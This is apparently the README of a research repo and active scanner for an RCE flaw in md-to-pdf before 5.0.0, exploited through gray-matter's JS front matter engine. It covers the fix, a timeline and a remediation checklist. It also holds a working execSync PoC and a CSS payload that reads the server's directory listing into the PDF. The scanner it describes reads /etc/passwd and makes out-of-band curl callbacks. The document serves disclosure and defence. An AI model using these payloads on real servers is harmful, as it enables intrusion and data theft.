# md-to-pdf RCE Scanner

> Research and active scanner for **SNYK-JS-MDTOPDF-1657880** —
> arbitrary code execution via gray-matter's JS front matter engine
> in `md-to-pdf < 5.0.0`.

---

## Background

[md-to-pdf](https://github.com/simonhaenisch/md-to-pdf) uses
[gray-matter](https://github.com/jonschlinkert/gray-matter) to parse
YAML front matter from Markdown files. By default, gray-matter exposes
a **JS engine** that allows front matter to be written as a JavaScript
expression — which it then effectively `eval`s.

This means that anyone who controls the Markdown content passed to
`md-to-pdf` can execute **arbitrary code on the server**.

Original issue reported by [@magicOz](https://github.com/magicOz) on
September 22, 2021.

- 📎 [simonhaenisch/md-to-pdf#99](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- 📎 [SNYK-JS-MDTOPDF-1657880](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)
- 📎 [gray-matter#131](https://github.com/jonschlinkert/gray-matter/issues/131)
- 📎 [dillinger#821](https://github.com/joemccann/dillinger/pull/821)

---

## The Vulnerability

### How it works

A standard Markdown file with YAML front matter looks like this:

```markdown
---
title: My Document
---
# Hello World
```

gray-matter supports alternative front matter engines, selectable via
a language tag on the opening fence. The JS engine is enabled **by
default** in affected versions:

```markdown
---js
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---
# Hello World
```

When `md-to-pdf` processes this file, gray-matter evaluates the JS
block — giving the attacker full Node.js execution in the context of
the server process.

### Original PoC

From the disclosure by @magicOz:

```js
const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';

(async () => {
    await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
```

```bash
$ cat /tmp/RCE.txt
cat: /tmp/RCE.txt: No such file or directory

$ node poc.js

$ cat /tmp/RCE.txt
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

### CSS exfiltration variant

As noted during research against [dillinger.io](https://dillinger.io),
even without direct command output in an HTTP response, data can be
exfiltrated by embedding it into the PDF's CSS — visible in the
rendered output:

```markdown
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```

This technique works against any app that renders the PDF and returns
or displays it to the requester.

### Why the `language` option alone is not sufficient

The gray-matter docs suggest setting `{ language: 'yaml' }` to default
to YAML parsing. However, as clarified in the disclosure thread, this
only sets the **default engine** when no language tag is present.
All engines remain accessible by explicitly tagging the fence block
(e.g. ` ---js `). **This does not mitigate the vulnerability.**

---

## Affected Versions

| Package     | Vulnerable | Patched  |
|-------------|------------|----------|
| md-to-pdf   | `< 5.0.0`  | `>= 5.0.0` |

Notable affected deployments at time of disclosure:

- **dillinger.io** — public Markdown editor using md-to-pdf for PDF
  export; was vulnerable to unauthenticated RCE via the export
  feature. Fixed via
  [dillinger#821](https://github.com/joemccann/dillinger/pull/821).

---

## Fix

Released in
[md-to-pdf v5.0.0](https://github.com/simonhaenisch/md-to-pdf/commit/a716259)
(September 24, 2021).

The JS engine now throws an error by default. The correct mitigation
is to override gray-matter's engine map:

```ts
// src/lib/md-to-pdf.ts
const { content: md, data: frontMatterConfig } = grayMatter(mdFileContent, {
    engines: {
        js: () => {
            throw new Error('JS engine is disabled for security reasons.');
        },
    },
});
```

To restore JS front matter explicitly (opt-in, trusted content only):

```ts
grayMatter(content, { engines: { js: undefined } });
```

---

## Scanner

This repo includes an active scanner (`mdtopdf_rce_scanner.py`) to
detect unpatched instances.

### Requirements

- Python 3.8+
- No third-party dependencies (stdlib only)

### Usage

```bash
# Basic scan
python mdtopdf_rce_scanner.py -u http://target.com

# With OOB callback (Burp Collaborator / interactsh)
python mdtopdf_rce_scanner.py -u http://target.com --callback-host your.burp.collab

# Custom upload endpoint
python mdtopdf_rce_scanner.py -u http://target.com --upload-path /api/convert

# Verbose + save report
python mdtopdf_rce_scanner.py -u http://target.com -v -o report.json
```

### Options

| Flag | Description |
|------|-------------|
| `-u`, `--url` | Target base URL *(required)* |
| `--upload-path` | POST endpoint path (default: `/new`) |
| `--content-field` | Form field name for markdown body (default: `content`) |
| `--callback-host` | OOB host for SSRF/DNS payload |
| `-o`, `--output` | Save findings to JSON file |
| `-v`, `--verbose` | Print request/response detail |

### Detection methods

The scanner uses layered detection rather than a single payload:

| Method | Description |
|--------|-------------|
| Version fingerprint | Probes `/package.json`, `/api/version`, etc. for `md-to-pdf < 5.0.0` |
| Safe probe | Confirms endpoint accepts markdown before sending any exploit payload |
| `file_write` | Writes a UUID canary to `/tmp` — confirms blind RCE |
| `recon` | Embeds `id && hostname` into PDF via CSS |
| `exfil_passwd` | Reads first line of `/etc/passwd` into PDF CSS |
| `ssrf_callback` | OOB `curl` callback (requires `--callback-host`) |
| Patch detection | Treats `"JS engine is disabled"` in response as confirmed-safe |

### Example output

```text
=== md-to-pdf RCE Scanner ===
    SNYK-JS-MDTOPDF-1657880 / gray-matter JS engine

[*] Target:  http://target.com
[*] Canary:  a3f2c1b8...
[*] Version: 4.1.0 → VULNERABLE
[*] Probing endpoint...
[*] Running payloads...

  [!!] POTENTIAL HIT — file_write
       JS front matter accepted without error (HTTP 200)
  [!!] POTENTIAL HIT — recon
       id command output detected
  [ok] exfil_passwd — no indicator
  [ok] ssrf_callback — no indicator (no --callback-host set)

======================================================================
SCAN REPORT — SNYK-JS-MDTOPDF-1657880
======================================================================

[!!] 2 potential finding(s)

  [1] file_write
       Target:   http://target.com
       CVE:      SNYK-JS-MDTOPDF-1657880
       Severity: CRITICAL
       Evidence: JS front matter accepted without error (HTTP 200)
```

---

## Remediation Checklist

- [ ] Upgrade `md-to-pdf` to `>= 5.0.0`
- [ ] Confirm gray-matter JS engine is explicitly disabled in your
      gray-matter options
- [ ] Never process untrusted Markdown content server-side without
      sandboxing
- [ ] If running dillinger, apply
      [dillinger#821](https://github.com/joemccann/dillinger/pull/821)
      or upgrade to a patched release
- [ ] Audit any other dependencies that use gray-matter directly

---

## Timeline

| Date | Event |
|------|-------|
| 2021-09-22 | Vulnerability reported by @magicOz in md-to-pdf#99 |
| 2021-09-22 | Maintainer confirms JS engine behaviour undesirable |
| 2021-09-23 | RCE confirmed against dillinger.io; @joemccann notified |
| 2021-09-24 | md-to-pdf v5.0.0 released with JS engine disabled by default |
| 2021-09-24 | dillinger#821 merged, updating md-to-pdf dependency |

---

## References

- [simonhaenisch/md-to-pdf#99](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- [SNYK-JS-MDTOPDF-1657880](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)
- [gray-matter#131](https://github.com/jonschlinkert/gray-matter/issues/131)
- [dillinger#821](https://github.com/joemccann/dillinger/pull/821)
- [md-to-pdf v5.0.0 patch commit](https://github.com/simonhaenisch/md-to-pdf/commit/a716259)
- [gray-matter docs — custom engines](https://github.com/jonschlinkert/gray-matter#optionsengines)

---

> ⚠️ **For authorised security testing only.** Do not use this tool
> against systems you do not have explicit written permission to test.
```
